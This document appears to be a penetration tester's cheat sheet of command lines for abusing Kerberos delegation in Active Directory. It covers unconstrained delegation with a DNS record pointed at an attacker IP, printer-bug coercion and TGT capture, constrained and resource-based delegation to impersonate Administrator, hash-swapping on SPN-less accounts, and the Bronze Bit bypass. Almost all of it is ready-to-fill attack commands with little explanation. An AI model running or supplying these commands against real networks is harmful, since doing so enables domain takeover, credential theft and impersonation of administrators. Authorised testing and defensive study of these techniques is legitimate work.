# Unconstrained Delegations

## Unconstrained Delegations - step 1
https://github.com/dirkjanm/krbrelayx
```
addspn.py -u '<DOMAIN>\<CompromisedAccont>' -p '<PASSWORD | HASH>' -s '<HOST>/<attacker.DOMAIN_FQDN>' --additional '<DomainController>'
```

## Unconstrained Delegations - step 2
```
dnstool.py -u '<DOMAIN>\<CompromisedAccont>' -p '<PASSWORD | HASH>' -r '<attacker.DOMAIN_FQDN>' -d '<attacker_IP>' --action add '<DomainController>'
```

## Unconstrained Delegations - step 3
```
nslookup <attacker.DOMAIN_FQDN> <DomainController>
```

## Unconstrained Delegations - step 4 A

```
krbrelayx.py --krbsalt '<DOMAINusername>' --krbpass '<password>'
```

## Unconstrained Delegations - step 4 B
```
krbrelayx.py -aesKey <aes256-cts-hmac-sha1-96-VALUE>
```
## Unconstrained Delegations - step 5
```
printerbug.py <domain>/'<vuln_account>$'@'<DC_IP>' -hashes <HASH> '<DomainController>'
```
## Unconstrained Delegations - step 6
```
export KRB5CCNAME=krbtgt.ccache
```

# Constrained Delegations

## Constrained Delegations - Full S4U2 (self + proxy)
```
impacket-getST -spn "cifs/<serviceA>" -impersonate "administrator" "<domain>/<serviceB>:<password>"
```

## Constrained Delegations - Additional S4U2proxy
```
impacket-getST -spn "cifs/<target>" -impersonate "administrator" -additional-ticket "administrator.ccache" "<domain>/<serviceA>:<password>"
```

# (RBCD) Resource-based constrained Delegations

## RBCD - edit the target's "rbcd" attribute Step 1.1
Read the attribute
```
impacket-rbcd -delegate-to '<target>$' -dc-ip '<DomainController>' -action 'read' '<domain>'/'<PowerfulUser>':'<Password>'
```

## RBCD - edit the target's "rbcd" attribute Step 1.2
Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
```
impacket-rbcd -delegate-from '<controlledaccount>' -delegate-to '<target>$' -dc-ip '<DomainController>' -action 'write' '<domain>'/'<PowerfulUser>':'<Password>'
```

## RBCD - obtain a ticket (delegation operation) Step 2
```
impacket-getST -spn 'cifs/<target>' -impersonate Administrator -dc-ip '<DomainController>' '<domain>/<controlledaccountwithSPN>:<SomePassword>'
```

## RBCD on SPN-less users - step 1
Obtain a TGT through overpass-the-hash to use RC4
```
impacket-getTGT -hashes :$(pypykatz crypto nt '<SomePassword>') '<domain>'/'<controlledaccountwithoutSPN>'
```
## RBCD on SPN-less users - step 2
Obtain the TGT session key
```
impacket-describeTicket 'TGT.ccache' | grep 'Ticket Session Key'
```
## RBCD on SPN-less users - step 3
Change the controlledaccountwithoutSPN's NT hash with the TGT session key
```
impacket-changepasswd -newhashes :<TGTSessionKey> '<domain>'/'<controlledaccountwithoutSPN>':'<SomePassword>'@'<DomainController>'
```
## RBCD on SPN-less users - step 4
Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
```
KRB5CCNAME='TGT.ccache' impacket-getST -u2u -impersonate "Administrator" -spn "<host>/<TargetDomain>" -k -no-pass '<domain>'/'<controlledaccountwithoutSPN>'
```
## RBCD on SPN-less users - step 5
The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
```
impacket-changepasswd -hashes :<TGTSessionKey> -newhashes :<OldNTHash> '<domain>'/'<controlledaccountwithoutSPN>'@'<DomainController>'
```

## Bronze Bit
```
impacket-getST -force-forwardable -spn "<Target_SPN>" -impersonate "Administrator" -dc-ip "<DC_HOST>" -hashes :"<NT_HASH>" "<DOMAIN>"/"<USER>"
```